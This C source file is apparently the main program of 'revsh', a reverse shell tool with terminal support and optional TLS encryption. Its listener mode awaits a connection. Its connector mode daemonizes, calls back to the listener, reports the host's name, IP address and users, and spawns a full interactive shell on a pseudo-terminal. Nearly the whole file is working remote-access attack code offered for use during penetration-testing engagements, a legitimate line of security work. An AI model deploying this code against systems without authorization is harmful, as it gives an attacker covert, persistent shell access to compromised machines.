
/*
	XXX

	Fixes:
		* redo comments. Everything there is from the previous incarnation.

	Features:
		* Add support for DHE w/RSA certs
		* Add support for a switch to point to a different rc file.
		* Add known good / tested architectures to the README.

	* Go through with a fine fucking tooth comb. Fucking meditate on this shit!

	And don't forget to update toolbin. :D


	XXX
*/


/*******************************************************************************
 *
 * revsh
 *
 * emptymonkey's reverse shell tool with terminal support
 *
 * 2013-07-17
 *
 *
 * The revsh tool is intended to be used as both a listener and remote client
 * in establishing a remote shell with terminal support. This isn't intended
 * as a replacement for netcat, but rather as a supplementary tool to ease 
 * remote interaction during long engagements.
 *
 *******************************************************************************/


#include "revsh.h"


/*******************************************************************************
 *
 * usage()
 *
 * Input: None.
 * Output: None.
 *
 * Purpose: Educate the user as to the error of their ways.
 *
 ******************************************************************************/
void usage(){
	fprintf(stderr, "\nusage: %s [-l [-s SHELL]] ADDRESS PORT\n", \
			program_invocation_short_name);
	fprintf(stderr, "\n\t-l: Setup a listener.\n");
	fprintf(stderr, "\t-s SHELL: Invoke SHELL as the remote shell. (Default is /bin/bash.)\n");
	fprintf(stderr, "\n\tNote: The '-s' switch only works with a listener.\n\n");

	exit(-1);
}



int main(int argc, char **argv){

	int i, retval, err_flag;

	int opt;
	char *shell = NULL;
	char *env_string = NULL;

	char *pty_name;
	int pty_master, pty_slave;
	struct termios saved_termios_attrs, new_termios_attrs;

	char **exec_argv;
	char **exec_envp;
	char **tmp_vector;

	int buff_len, tmp_len;
	char *buff_head, *buff_tail;
	char *tmp_ptr;

	int io_bytes;

	struct winsize tty_winsize;

	char tmp_char;

	struct remote_io_helper io;

  BIO *accept;

	struct passwd *passwd_entry;

	char *cipher_list = NULL;
	

	io.listener = 0;
	io.encryption = ADH;

	while((opt = getopt(argc, argv, "paels:")) != -1){
		switch(opt){

			case 'p':
				io.encryption = PLAINTEXT;
				break;

			case 'a':
				io.encryption = ADH;
				break;

			case 'e':
				io.encryption = EDH;
				break;

			case 'l':
				io.listener = 1;
				break;

			case 's':
				shell = optarg;
				break;

			default:
				usage();
		}
	}


	if((argc - optind) != 2){
		usage();
	}

	switch(io.encryption){
	
		case ADH:
			cipher_list = ADH_CIPHER;
			break;

		case EDH:
			cipher_list = EDH_CIPHER;
			break;
	}

	if(io.encryption){
		if(io.listener){
			printf("DEBUG: cipher_list: %s\n", cipher_list);
		}else{
			printf("DEBUG: CLIENT_CIPHER: %s\n", CLIENT_CIPHER);
		}
	}

	buff_len = getpagesize();
	if((buff_head = (char *) calloc(buff_len, sizeof(char))) == NULL){
		error(-1, errno, "calloc(%d, %d)", buff_len, (int) sizeof(char));
	}

	tmp_len = strlen(argv[optind]);
	memcpy(buff_head, argv[optind], tmp_len);
	buff_head[tmp_len++] = ':';
	strcat(buff_head, argv[optind + 1]);

	SSL_library_init();
  SSL_load_error_strings();

	if(io.encryption){
		io.remote_read = &remote_read_encrypted;
		io.remote_write = &remote_write_encrypted;
	}else{
		io.remote_read = &remote_read_plaintext;
		io.remote_write = &remote_write_plaintext;
	}

	/*
	 * Listener:
	 * - Open a socket.
	 * - Listen for a connection.
	 * - Send initial shell data.
	 * - Send initial environment data.
	 * - Send initial termios data.
	 * - Set local terminal to raw. 
	 * - Enter broker() for data brokering.
	 * - Reset local term.
	 * - Exit.
	 */
	if(io.listener){

		printf("Listening...");
		fflush(stdout);

		if(io.encryption){

			if((io.ctx = SSL_CTX_new(TLSv1_server_method())) == NULL){
				fprintf(stderr, "%s: %d: SSL_CTX_new(TLSv1_server_method()): %s\n", \
						program_invocation_short_name, io.listener, strerror(errno));
				ERR_print_errors_fp(stderr);
				exit(-1);
			}

			if((io.dh = get_dh2048()) == NULL){
				fprintf(stderr, "%s: %d: get_dh2048(): %s\n", \
						program_invocation_short_name, io.listener, strerror(errno));
				ERR_print_errors_fp(stderr);
				exit(-1);
			}

			if(!SSL_CTX_set_tmp_dh(io.ctx, io.dh)){
				fprintf(stderr, "%s: %d: SSL_CTX_set_tmp_dh(%lx, %lx): %s\n", \
						program_invocation_short_name, io.listener, (unsigned long) io.ctx, (unsigned long) io.dh, strerror(errno));
				ERR_print_errors_fp(stderr);
				exit(-1);
			}

			if(SSL_CTX_set_cipher_list(io.ctx, cipher_list) != 1){
				fprintf(stderr, "%s: %d: SSL_CTX_set_cipher_list(%lx, %s): %s\n", \
						program_invocation_short_name, io.listener, (unsigned long) io.ctx, cipher_list, strerror(errno));
				ERR_print_errors_fp(stderr);
				exit(-1);
			}
		}

		if((accept = BIO_new_accept(buff_head)) == NULL){
			fprintf(stderr, "%s: %d: BIO_new_accept(%s): %s\n", \
						program_invocation_short_name, io.listener, buff_head, strerror(errno));
			ERR_print_errors_fp(stderr);
			exit(-1);
		}

		if(BIO_set_bind_mode(accept, BIO_BIND_REUSEADDR) <= 0){
			fprintf(stderr, "%s: %d: BIO_set_bind_mode(%lx, BIO_BIND_REUSEADDR): %s\n", \
						program_invocation_short_name, io.listener, (unsigned long) accept, strerror(errno));
			ERR_print_errors_fp(stderr);
			exit(-1);
		}

		if(BIO_do_accept(accept) <= 0){
			fprintf(stderr, "%s: %d: BIO_do_accept(%lx): %s\n", \
						program_invocation_short_name, io.listener, (unsigned long) accept, strerror(errno));
			ERR_print_errors_fp(stderr);
			exit(-1);
		}

		if(BIO_do_accept(accept) <= 0){
			fprintf(stderr, "%s: %d: BIO_do_accept(%lx): %s\n", \
						program_invocation_short_name, io.listener, (unsigned long) accept, strerror(errno));
			ERR_print_errors_fp(stderr);
			exit(-1);
		}

		if((io.connect = BIO_pop(accept)) == NULL){
			fprintf(stderr, "%s: %d: BIO_pop(%lx): %s\n", \
						program_invocation_short_name, io.listener, (unsigned long) accept, strerror(errno));
			ERR_print_errors_fp(stderr);
			exit(-1);
		}

		BIO_free(accept);

		if(BIO_get_fd(io.connect, &(io.remote_fd)) < 0){
			fprintf(stderr, "%s: %d: BIO_get_fd(%lx, %lx): %s\n", \
						program_invocation_short_name, io.listener, (unsigned long) io.connect, (unsigned long) &(io.remote_fd), strerror(errno));
			ERR_print_errors_fp(stderr);
			exit(-1);
		}

		if(io.encryption){
			if(!(io.ssl = SSL_new(io.ctx))){
				fprintf(stderr, "%s: %d: SSL_new(%lx): %s\n", \
						program_invocation_short_name, io.listener, (unsigned long) io.ctx, strerror(errno));
				ERR_print_errors_fp(stderr);
				exit(-1); 
			}

			SSL_set_bio(io.ssl, io.connect, io.connect);

			if(SSL_accept(io.ssl) < 1){
				fprintf(stderr, "%s: %d: SSL_accept(%lx): %s\n", \
						program_invocation_short_name, io.listener, (unsigned long) io.ssl, strerror(errno));
				ERR_print_errors_fp(stderr);
				exit(-1);
			}
		}

		printf("Initializing...");
		fflush(stdout);

		// - Send initial shell data.
		memset(buff_head, 0, buff_len);
		buff_tail = buff_head;
		*(buff_tail++) = (char) APC;
		if(shell){
			tmp_len = strlen(shell);
			memcpy(buff_tail, shell, tmp_len);
		}else{
			tmp_len = strlen(DEFAULT_SHELL);
			memcpy(buff_tail, DEFAULT_SHELL, tmp_len);
		}
		buff_tail += tmp_len;

		*(buff_tail++) = (char) ST;

		if((buff_tail - buff_head) >= buff_len){
			print_error(&io, "%s: %d: Environment string too long.\n", program_invocation_short_name, io.listener);
			exit(-1);
		}

		tmp_len = strlen(buff_head);
		if((io_bytes = io.remote_write(&io, buff_head, tmp_len)) == -1){
			print_error(&io, "%s: %d: io.remote_write(%lx, %lx, %d): %s\n", \
					program_invocation_short_name, io.listener, \
					(unsigned long) &io, (unsigned long) buff_head, tmp_len, strerror(errno));
			exit(-1);
		}

		if(io_bytes != (buff_tail - buff_head)){
			print_error(&io, "%s: %d: io.remote_write(%lx, %lx, %d): Unable to write entire string.\n", \
					program_invocation_short_name, io.listener, \
					(unsigned long) &io, (unsigned long) buff_head, buff_len);
			exit(-1);
		}

		// - Send initial environment data.
		tmp_len = strlen(DEFAULT_ENV);
		if((env_string = (char *) calloc(tmp_len + 1, sizeof(char))) == NULL){
			print_error(&io, "%s: %d: calloc(strlen(%d, %d)): %s\n", \
					program_invocation_short_name, io.listener, \
					tmp_len + 1, (int) sizeof(char), strerror(errno));
			exit(-1);
		}

		memcpy(env_string, DEFAULT_ENV, tmp_len);

		if((exec_envp = string_to_vector(env_string)) == NULL){
			print_error(&io, "%s: %d: string_to_vector(%s): %s\n", \
					program_invocation_short_name, io.listener, \
					env_string, strerror(errno));
			exit(-1);
		}

		buff_tail = buff_head;
		*(buff_tail++) = (char) APC;

		for(i = 0; exec_envp[i]; i++){

			if((buff_tail - buff_head) >= buff_len){
				print_error(&io, "%s: %d: Environment string too long.\n", \
						program_invocation_short_name, io.listener);
				exit(-1);
			}else if(buff_tail != (buff_head + 1)){
				*(buff_tail++) = ' ';
			}

			tmp_len = strlen(exec_envp[i]);
			memcpy(buff_tail, exec_envp[i], tmp_len);

			buff_tail += tmp_len;

			*(buff_tail++) = '=';

			if((tmp_ptr = getenv(exec_envp[i])) == NULL){
				fprintf(stderr, "%s: No such environment variable \"%s\". Ignoring.\n", \
						program_invocation_short_name, exec_envp[i]);
			}else{
				tmp_len = strlen(tmp_ptr);
				memcpy(buff_tail, tmp_ptr, tmp_len);
				buff_tail += tmp_len;
			}
		}

		*(buff_tail++) = (char) ST;

		if((buff_tail - buff_head) >= buff_len){
			print_error(&io, "%s: %d: Environment string too long.\n", \
					program_invocation_short_name, io.listener);
			exit(-1);
		}

		tmp_len = strlen(buff_head);
		if((io_bytes = io.remote_write(&io, buff_head, tmp_len)) == -1){
			print_error(&io, "%s: %d: io.remote_write(%lx, %lx, %d): %s\n", \
					program_invocation_short_name, io.listener, \
					(unsigned long) &io, (unsigned long) buff_head, tmp_len, strerror(errno));
			exit(-1);
		}

		if(io_bytes != (buff_tail - buff_head)){
			print_error(&io, "%s: %d: io.remote_write(%lx, %lx, %d): Unable to write entire string.\n", \
					program_invocation_short_name, io.listener, \
					(unsigned long) &io, (unsigned long) buff_head, buff_len);
			exit(-1);
		}


		// - Send initial termios data.
		if((retval = ioctl(STDIN_FILENO, TIOCGWINSZ, &tty_winsize)) == -1){
			print_error(&io, "%s: %d: ioctl(STDIN_FILENO, TIOCGWINSZ, %lx): %s\n", \
					program_invocation_short_name, io.listener, \
					(unsigned long) &tty_winsize, strerror(errno));
			exit(-1);
		}

		memset(buff_head, 0, buff_len);
		buff_tail = buff_head;
		*(buff_tail++) = (char) APC;

		if((retval = snprintf(buff_tail, buff_len - 2, "%hd %hd", \
						tty_winsize.ws_row, tty_winsize.ws_col)) < 0){
			print_error(&io, "%s: %d: snprintf(buff_head, buff_len, \"%%hd %%hd\", %hd, %hd): %s\n", \
					program_invocation_short_name, io.listener, \
					tty_winsize.ws_row, tty_winsize.ws_col, strerror(errno));
			exit(-1);
		}

		buff_tail += retval;
		*(buff_tail++) = (char) ST;

		tmp_len = strlen(buff_head);
		if((io_bytes = io.remote_write(&io, buff_head, tmp_len)) == -1){
			print_error(&io, "%s: %d: io.remote_write(%lx, %lx, %d): %s\n", \
					program_invocation_short_name, io.listener, \
					(unsigned long) &io, (unsigned long) buff_head, tmp_len, strerror(errno));
			exit(-1);
		}

		if(io_bytes != tmp_len){
			print_error(&io, "%s: %d: io.remote_write(%lx, %lx, %d): Unable to write entire string.\n", \
					program_invocation_short_name, io.listener, \
					(unsigned long) &io, (unsigned long) buff_head, tmp_len);
			exit(-1);
		}

		// - Set local terminal to raw. 
		if((retval = tcgetattr(STDIN_FILENO, &saved_termios_attrs)) == -1){
			print_error(&io, "%s: %d: tcgetattr(STDIN_FILENO, %lx): %s\n", \
					program_invocation_short_name, io.listener, \
					(unsigned long) &saved_termios_attrs, strerror(errno));
			exit(-1);
		}

		memcpy(&new_termios_attrs, &saved_termios_attrs, sizeof(struct termios));

		new_termios_attrs.c_lflag &= ~(ECHO|ICANON|IEXTEN|ISIG);
		new_termios_attrs.c_iflag &= ~(BRKINT|ICRNL|INPCK|ISTRIP|IXON);
		new_termios_attrs.c_cflag &= ~(CSIZE|PARENB);
		new_termios_attrs.c_cflag |= CS8;
		new_termios_attrs.c_oflag &= ~(OPOST);

		new_termios_attrs.c_cc[VMIN] = 1;
		new_termios_attrs.c_cc[VTIME] = 0;

		if((retval = tcsetattr(STDIN_FILENO, TCSANOW, &new_termios_attrs)) == -1){
			print_error(&io, "%s: %d: tcsetattr(STDIN_FILENO, TCSANOW, %lx): %s\n", \
					program_invocation_short_name, io.listener, \
					(unsigned long) &new_termios_attrs, strerror(errno));
			exit(-1);
		}	

		printf("\tDone!\r\n");
		fflush(stdout);

		io.local_fd = STDIN_FILENO;

		errno = 0;
		// - Enter broker() for data brokering.
		if((retval = broker(&io) == -1)){
			print_error(&io, "%s: %d: broker(%lx): %s\r\n", \
					program_invocation_short_name, io.listener, (unsigned long) &io,
					strerror(errno));
		}

		err_flag = 0;
		if(errno == ECONNRESET){
			err_flag = errno;
		}

		// - Reset local term.
		tcsetattr(STDIN_FILENO, TCSANOW, &saved_termios_attrs);

		// - Exit.
		if(!err_flag){
			printf("Good-bye!\n");

		}else{
			while((retval = io.remote_read(&io, buff_head, buff_len)) > 0){
				write(STDERR_FILENO, buff_head, retval);
			}
		}
		if(io.encryption){
			SSL_shutdown(io.ssl);
			SSL_free(io.ssl);
			SSL_CTX_free(io.ctx);
		}else{
			BIO_free(io.connect);
		}

		return(0);

	}else{

		/*
		 * Connector: 
		 * - Become a daemon.
		 * - Open a network connection back to a listener.
		 * - Check for usage and exit, if needed. 
		 * - Receive and set the shell.
		 * - Receive and set the initial environment.
		 * - Receive and set the initial termios.
		 * - Create a pseudo-terminal (pty).
		 * - Send basic information back to the listener about the connecting host.
		 * - Fork a child to run the shell.
		 * - Parent: Enter the broker() and broker data.
		 * - Child: Initialize file descriptors.
		 * - Child: Set the pty as controlling.
		 * - Child: Call execve() to invoke a shell.
		 */


		// - Become a daemon.
		umask(0);


		retval = fork();

#ifndef DEBUG

		if(retval == -1){
			error(-1, errno, "fork()");
		}else if(retval){
			exit(0);
		}

		if((retval = setsid()) == -1){
			error(-1, errno, "setsid()");
		}

		if((retval = chdir("/")) == -1){
			error(-1, errno, "chdir(\"/\")");
		}

#endif

		if(io.encryption){

			if((io.ctx = SSL_CTX_new(TLSv1_client_method())) == NULL){
#ifndef DEBUG
				fprintf(stderr, "%s: %d: SSL_CTX_new(TLSv1_client_method()): %s\n", \
						program_invocation_short_name, io.listener, strerror(errno));
				ERR_print_errors_fp(stderr);
#endif
				exit(-1);
			}

			if(SSL_CTX_set_cipher_list(io.ctx, CLIENT_CIPHER) != 1){
#ifndef DEBUG
				fprintf(stderr, "%s: %d: SSL_CTX_set_cipher_list(%lx, %s): %s\n", \
						program_invocation_short_name, io.listener, (unsigned long) io.ctx, CLIENT_CIPHER, strerror(errno));
				ERR_print_errors_fp(stderr);
#endif
				exit(-1);
			}
		}

		if((io.connect = BIO_new_connect(buff_head)) == NULL){
#ifndef DEBUG
			fprintf(stderr, "%s: %d: BIO_new_connect(%s): %s\n", \
					program_invocation_short_name, io.listener, buff_head, strerror(errno));
			ERR_print_errors_fp(stderr);
#endif
			exit(-1);
		}

		if(BIO_do_connect(io.connect) <= 0){
#ifndef DEBUG
			fprintf(stderr, "%s: %d: BIO_do_connect(%lx): %s\n", \
					program_invocation_short_name, io.listener, (unsigned long) io.connect, strerror(errno));
			ERR_print_errors_fp(stderr);
#endif
			exit(-1);
		}

		if(BIO_get_fd(io.connect, &(io.remote_fd)) < 0){
#ifndef DEBUG
			fprintf(stderr, "%s: %d: BIO_get_fd(%lx, %lx): %s\n", \
					program_invocation_short_name, io.listener, \
					(unsigned long) io.connect, (unsigned long) &(io.remote_fd), strerror(errno));
			ERR_print_errors_fp(stderr);
#endif
			exit(-1);
		}

		if(io.encryption > PLAINTEXT){

			if(!(io.ssl = SSL_new(io.ctx))){
#ifndef DEBUG
				fprintf(stderr, "%s: %d: SSL_new(%lx): %s\n", \
						program_invocation_short_name, io.listener, (unsigned long) io.ctx, strerror(errno));
				ERR_print_errors_fp(stderr);
#endif
				exit(-1);
			}

			SSL_set_bio(io.ssl, io.connect, io.connect);

			if((retval = SSL_connect(io.ssl)) < 1){
#ifndef DEBUG
				fprintf(stderr, "%s: %d: SSL_connect(%lx): %s\n", \
						program_invocation_short_name, io.listener, (unsigned long) io.ssl, strerror(errno));
				ERR_print_errors_fp(stderr);
#endif
				exit(-1);
			}
		}

		// - Check for usage and exit, if needed. 
		// We do this after the network connect so the error
		// reporting gets sent back to the listener, if possible.
		if(shell){
			print_error(&io, "%s: %d: remote usage error: Only listeners can invoke -s!\r\n", \
					program_invocation_short_name, io.listener);
			exit(-1);
		}

		// - Receive and set the shell.
		if((io_bytes = io.remote_read(&io, &tmp_char, 1)) == -1){
			print_error(&io, "%s: %d: io.remote_read(%lx, %lx, %d): %s\r\n", \
					program_invocation_short_name, io.listener, (unsigned long) &io, (unsigned long) &tmp_char, 1, strerror(errno));
			exit(-1);
		}

		if(tmp_char != (char) APC){
			print_error(&io, "%s: %d: invalid initialization: shell\r\n", program_invocation_short_name, io.listener);
			exit(-1);
		}

		memset(buff_head, 0, buff_len);
		buff_tail = buff_head;

		if((io_bytes = io.remote_read(&io, &tmp_char, 1)) == -1){
			print_error(&io, "%s: %d: io.remote_read(%lx, %lx, 1): %s\r\n", \
					program_invocation_short_name, io.listener, \
					(unsigned long) &io, (unsigned long) &tmp_char, strerror(errno));
			exit(-1);
		}

		while(tmp_char != (char) ST){
			*(buff_tail++) = tmp_char;

			if((buff_tail - buff_head) >= buff_len){
				print_error(&io, "%s: %d: Shell string too long.\r\n", \
						program_invocation_short_name, io.listener);
				exit(-1);
			}

			if((io_bytes = io.remote_read(&io, &tmp_char, 1)) == -1){
				print_error(&io, "%s: %d: io.remote_read(%lx, %lx, 1): %s\r\n", \
						program_invocation_short_name, io.listener, \
						(unsigned long) &io, (unsigned long) &tmp_char, strerror(errno));
				exit(-1);
			}
		}

		tmp_len = strlen(buff_head);
		if((shell = (char *) calloc(tmp_len + 1, sizeof(char))) == NULL){
			print_error(&io, "%s: %d: calloc(%d, %d): %s\r\n", \
					program_invocation_short_name, io.listener, \
					tmp_len + 1, (int) sizeof(char), strerror(errno));
			exit(-1);
		}
		memcpy(shell, buff_head, tmp_len);


		// - Receive and set the initial environment.
		if((io_bytes = io.remote_read(&io, &tmp_char, 1)) == -1){
			print_error(&io, "%s: %d: io.remote_read(%lx, %lx, 1): %s\r\n", \
					program_invocation_short_name, io.listener, \
					(unsigned long) &io, (unsigned long) &tmp_char, strerror(errno));
			exit(-1);
		}

		if(tmp_char != (char) APC){
			print_error(&io, "%s: %d: invalid initialization: environment\r\n", \
					program_invocation_short_name, io.listener);
			exit(-1);
		}

		memset(buff_head, 0, buff_len);
		buff_tail = buff_head;

		if((io_bytes = io.remote_read(&io, &tmp_char, 1)) == -1){
			print_error(&io, "%s: %d: io.remote_read(%lx, %lx, 1): %s\r\n", \
					program_invocation_short_name, io.listener, \
					(unsigned long) &io, (unsigned long) &tmp_char, strerror(errno));
			exit(-1);
		}

		while(tmp_char != (char) ST){
			*(buff_tail++) = tmp_char;

			if((buff_tail - buff_head) >= buff_len){
				print_error(&io, "%s: %d: Environment string too long.\r\n", \
						program_invocation_short_name, io.listener);
				exit(-1);
			}

			if((io_bytes = io.remote_read(&io, &tmp_char, 1)) == -1){
				print_error(&io, "%s: %d: io.remote_read(%lx, %lx, 1): %s\r\n", \
						program_invocation_short_name, io.listener, \
						(unsigned long) &io, (unsigned long) &tmp_char, strerror(errno));
				exit(-1);
			}
		}

		if((exec_envp = string_to_vector(buff_head)) == NULL){
			print_error(&io, "%s: %d: string_to_vector(%s): %s\r\n", \
					program_invocation_short_name, io.listener, \
					buff_head, strerror(errno));
			exit(-1);
		}

		// - Receive and set the initial termios.
		if((io_bytes = io.remote_read(&io, &tmp_char, 1)) == -1){
			print_error(&io, "%s: %d: io.remote_read(%lx, %lx, 1): %s\r\n", \
					program_invocation_short_name, io.listener, \
					(unsigned long) &io, (unsigned long) &tmp_char, strerror(errno));
			exit(-1);
		}

		if(tmp_char != (char) APC){
			print_error(&io, "%s: %d: invalid initialization: termios\r\n", \
					program_invocation_short_name, io.listener);
			exit(-1);
		}

		memset(buff_head, 0, buff_len);
		buff_tail = buff_head;

		if((io_bytes = io.remote_read(&io, &tmp_char, 1)) == -1){
			print_error(&io, "%s: %d: io.remote_read(%lx, %lx, 1): %s\r\n", \
					program_invocation_short_name, io.listener, \
					(unsigned long) &io, (unsigned long) &tmp_char, strerror(errno));
			exit(-1);
		}

		while(tmp_char != (char) ST){
			*(buff_tail++) = tmp_char;

			if((buff_tail - buff_head) >= buff_len){
				print_error(&io, "%s: %d: termios string too long.\r\n", \
						program_invocation_short_name, io.listener);
				exit(-1);
			}

			if((io_bytes = io.remote_read(&io, &tmp_char, 1)) == -1){
				print_error(&io, "%s: %d: io.remote_read(%lx, %lx, 1): %s\r\n", \
						program_invocation_short_name, io.listener, \
						(unsigned long) &io, (unsigned long) &tmp_char, strerror(errno));
				exit(-1);
			}
		}

		if((tmp_vector = string_to_vector(buff_head)) == NULL){
			print_error(&io, "%s: %d: string_to_vector(%s): %s\r\n", \
					program_invocation_short_name, io.listener, \
					strerror(errno));
			exit(-1);
		}

		if(tmp_vector[0] == NULL){
			print_error(&io, "%s: %d: invalid initialization: tty_winsize.ws_row\r\n", \
					program_invocation_short_name, io.listener);
			exit(-1);
		}

		errno = 0;
		tty_winsize.ws_row = strtol(tmp_vector[0], NULL, 10);
		if(errno){
			print_error(&io, "%s: %d: strtol(%s): %s\r\n", \
					program_invocation_short_name, io.listener, \
					strerror(errno));
			exit(-1);
		}

		if(tmp_vector[1] == NULL){
			print_error(&io, "%s: %d: invalid initialization: tty_winsize.ws_col\r\n", \
					program_invocation_short_name, io.listener);
			exit(-1);
		}

		errno = 0;
		tty_winsize.ws_col = strtol(tmp_vector[1], NULL, 10);
		if(errno){
			print_error(&io, "%s: %d: strtol(%s): %s\r\n", \
					program_invocation_short_name, io.listener, \
					strerror(errno));
			exit(-1);
		}

		// - Create a pseudo-terminal (pty).
		if((pty_master = posix_openpt(O_RDWR|O_NOCTTY)) == -1){
			print_error(&io, "%s: %d: posix_openpt(O_RDWR|O_NOCTTY): %s\r\n", \
					program_invocation_short_name, io.listener, \
					strerror(errno));
			exit(-1);
		}

		if((retval = grantpt(pty_master)) == -1){
			print_error(&io, "%s: %d: grantpt(%d): %s\r\n", \
					program_invocation_short_name, io.listener, \
					pty_master, strerror(errno));
			exit(-1);
		}

		if((retval = unlockpt(pty_master)) == -1){
			print_error(&io, "%s: %d: unlockpt(%d): %s\r\n", \
					program_invocation_short_name, io.listener, \
					pty_master, strerror(errno));
			exit(-1);
		}

		if((retval = ioctl(pty_master, TIOCSWINSZ, &tty_winsize)) == -1){
			print_error(&io, "%s: %d: ioctl(%d, %d, %lx): %s\r\n", \
					program_invocation_short_name, io.listener, \
					pty_master, TIOCGWINSZ, (unsigned long) &tty_winsize, strerror(errno));
			exit(-1);
		}

		if((pty_name = ptsname(pty_master)) == NULL){
			print_error(&io, "%s: %d: ptsname(%d): %s\r\n", \
					program_invocation_short_name, io.listener, \
					pty_master, strerror(errno));
			exit(-1);
		}

		if((pty_slave = open(pty_name, O_RDWR|O_NOCTTY)) == -1){
			print_error(&io, "%s: %d: open(%s, O_RDWR|O_NOCTTY): %s\r\n", \
					program_invocation_short_name, io.listener, \
					pty_name, strerror(errno));
			exit(-1);
		}

		// - Send basic information back to the listener about the connecting host.
		//   (e.g. hostname, ip address, username)
		memset(buff_head, 0, buff_len);
		if((retval = gethostname(buff_head, buff_len - 1)) == -1){
			print_error(&io, "%s: %d: gethostname(%lx, %d): %s\r\n", \
					program_invocation_short_name, io.listener, \
					(unsigned long) buff_head, buff_len - 1, strerror(errno));
			exit(-1);
		}

		remote_printf(&io, "################################\r\n");
		remote_printf(&io, "# hostname: %s\r\n", buff_head);

		io.ip_addr = BIO_get_conn_ip(io.connect);
		remote_printf(&io, "# ip address: %d.%d.%d.%d\r\n", io.ip_addr[0], io.ip_addr[1], io.ip_addr[2], io.ip_addr[3]);

		// if the uid doesn't match an entry in /etc/passwd, we don't want to crash.
		// Borrowed the "I have no name!" from bash, as that is what it will display in this situation arises.
		passwd_entry = getpwuid(getuid());
		remote_printf(&io, "# real user: ");
		if(passwd_entry && passwd_entry->pw_name){
			remote_printf(&io, "%s", passwd_entry->pw_name);
		}else{
			remote_printf(&io, "I have no name!");
		}
		remote_printf(&io, "\r\n");

		passwd_entry = getpwuid(geteuid());
		remote_printf(&io, "# effective user: ");
		if(passwd_entry && passwd_entry->pw_name){
			remote_printf(&io, "%s", passwd_entry->pw_name);
		}else{
			remote_printf(&io, "I have no name!");
		}
		remote_printf(&io, "\r\n");

		remote_printf(&io, "################################\r\n");


		if((retval = close(STDIN_FILENO)) == -1){
			print_error(&io, "%s: %d: close(STDIN_FILENO): %s\r\n", \
					program_invocation_short_name, io.listener, \
					strerror(errno));
			exit(-1);
		}

		if((retval = close(STDOUT_FILENO)) == -1){
			print_error(&io, "%s: %d: close(STDOUT_FILENO): %s\r\n", \
					program_invocation_short_name, io.listener, \
					strerror(errno));
			exit(-1);
		}

#ifndef DEBUG

		if((retval = close(STDERR_FILENO)) == -1){
			print_error(&io, "%s: %d: close(STDERR_FILENO): %s\r\n", \
					program_invocation_short_name, io.listener, \
					strerror(errno));
			exit(-1);
		}

#endif

		// - Fork a child to run the shell.
		retval = fork();

		if(retval == -1){
			print_error(&io, "%s: %d: fork(): %s\r\n", \
					program_invocation_short_name, io.listener, \
					strerror(errno));
			exit(-1);
		}

		if(retval){

			// - Parent: Enter the broker() and broker data.
			if((retval = close(pty_slave)) == -1){
				print_error(&io, "%s: %d: close(%d): %s\r\n", \
						program_invocation_short_name, io.listener, \
						pty_slave, strerror(errno));
				exit(-1);
			}

			io.local_fd = pty_master;

			retval = broker(&io);

			if((retval == -1)){
				print_error(&io, "%s: %d: broker(%lx): %s\r\n", \
						program_invocation_short_name, io.listener, \
						(unsigned long) &io, strerror(errno));
				exit(-1);
			}

			if(io.encryption){
				SSL_shutdown(io.ssl);
				SSL_free(io.ssl);
				SSL_CTX_free(io.ctx);
			}

			return(0);
		}

		// - Child: Initialize file descriptors.
		if((retval = close(pty_master)) == -1){
			print_error(&io, "%s: %d: close(%d): %s\r\n", \
					program_invocation_short_name, io.listener, \
					pty_master, strerror(errno));
			exit(-1);
		}
		if((retval = dup2(pty_slave, STDIN_FILENO)) == -1){
			print_error(&io, "%s: %d: dup2(%d, STDIN_FILENO): %s\r\n", \
					program_invocation_short_name, io.listener, \
					pty_slave, strerror(errno));
			exit(-1);
		}

		if((retval = dup2(pty_slave, STDOUT_FILENO)) == -1){
			print_error(&io, "%s: %d: dup2(%d, STDOUT_FILENO): %s\r\n", \
					program_invocation_short_name, io.listener, \
					pty_slave, strerror(errno));
			exit(-1);
		}

		if((retval = dup2(pty_slave, STDERR_FILENO)) == -1){
			print_error(&io, "%s: %d: dup2(%d, %d): %s\r\n", \
					program_invocation_short_name, io.listener, \
					pty_slave, STDERR_FILENO, strerror(errno));
			exit(-1);
		}

		if((retval = close(io.remote_fd)) == -1){
			print_error(&io, "%s: %d: close(%d): %s\r\n", \
					program_invocation_short_name, io.listener, \
					io.remote_fd, strerror(errno));
			exit(-1);
		}

		if((retval = close(pty_slave)) == -1){
			error(-1, errno, "close(%d)", pty_slave);
		}

		if((retval = setsid()) == -1){
			error(-1, errno, "setsid()");
		} 

		// - Child: Set the pty as controlling.
		if((retval = ioctl(STDIN_FILENO, TIOCSCTTY, 1)) == -1){
			error(-1, errno, "ioctl(STDIN_FILENO, TIOCSCTTY, 1)");
		}

		// - Child: Call execve() to invoke a shell.
		errno = 0;
		if((exec_argv = string_to_vector(shell)) == NULL){
			error(-1, errno, "string_to_vector(%s)", shell);
		}

		execve(exec_argv[0], exec_argv, exec_envp);
		error(-1, errno, "execve(%s, %lx, NULL): shouldn't be here.", \
				exec_argv[0], (unsigned long) exec_argv);
	}

	return(-1);
}
